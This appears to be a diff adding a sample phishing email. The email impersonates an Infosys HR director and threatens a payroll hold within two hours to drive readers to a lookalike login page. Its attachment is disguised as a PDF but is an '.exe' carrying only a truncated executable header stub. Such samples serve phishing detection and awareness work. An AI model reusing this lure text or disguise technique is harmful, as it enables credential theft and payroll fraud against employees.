@@ -1,0 +1,44 @@
+From: "Priya Sharma (Director HR)" <priya.sharma@infosys.com>
+To: target-employee@enterprise-org.in
+Subject: CRITICAL: Immediate Action Required - Updated Q3 Compensation & Direct Deposit Confirmation
+Date: Wed, 10 Sep 2026 14:15:32 +0530
+Message-ID: <payroll-override-98234@darknet-mailer-09.ru>
+Reply-To: security-override@darknet-mailer-09.ru
+Return-Path: <bounce@darknet-mailer-09.ru>
+Authentication-Results: mx.google.com;
+    spf=fail (google.com: domain of bounce@darknet-mailer-09.ru does not designate 185.220.101.5 as permitted sender) smtp.mailfrom=bounce@darknet-mailer-09.ru;
+    dkim=fail header.i=@darknet-mailer-09.ru;
+    dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=infosys.com
+Received: from mail.darknet-mailer-09.ru (unknown [185.220.101.5])
+    by mx.google.com with ESMTPS id j9si3928108wmy.42.2026.09.10.14.15.32
+    for <target-employee@enterprise-org.in>;
+    Wed, 10 Sep 2026 14:15:32 +0530
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_98234_18923482"
+
+------=_Part_98234_18923482
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+Dear Employee,
+
+Our biometric payroll processing server detected an irregular discrepancy in your employee direct deposit routing credentials. 
+
+Failure to verify your updated banking information within the next 2 hours will result in automatic withholding of your Q3 compensation cycle and temporary account suspension.
+
+Please review the attached confidential document immediately and complete your verification:
+https://portal-infosys-employee-verify.com/login
+
+Sincerely,
+Priya Sharma
+Corporate HR Operations & Executive Payroll
+
+------=_Part_98234_18923482
+Content-Type: application/octet-stream; name="Q3_Executive_Payroll_Bonus_Matrix.pdf.exe"
+Content-Disposition: attachment; filename="Q3_Executive_Payroll_Bonus_Matrix.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAAAAAAAA
+------=_Part_98234_18923482--
